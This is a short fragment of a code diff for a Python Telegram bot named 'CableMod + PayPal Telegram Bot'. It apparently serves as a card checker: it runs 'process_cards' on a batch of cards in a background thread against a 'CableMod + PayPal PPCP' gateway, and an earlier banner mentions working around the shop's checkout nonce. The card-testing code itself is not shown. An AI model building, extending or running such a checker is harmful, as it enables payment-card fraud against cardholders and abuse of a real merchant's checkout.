         parse_mode='Markdown'
     )
+    def run_checker():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(process_cards(cards, context.application))
+        loop.close()
+    threading.Thread(target=run_checker, daemon=True).start()
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
@@ -1012,7 +802,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     print("=" * 60)
     print("  CableMod + PayPal Telegram Bot")
-    print("  تم إضافة منتج للسلة → حل مشكلة update_order_review_nonce")
+    print("  Gateway: CableMod + PayPal PPCP")
     print("=" * 60)
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
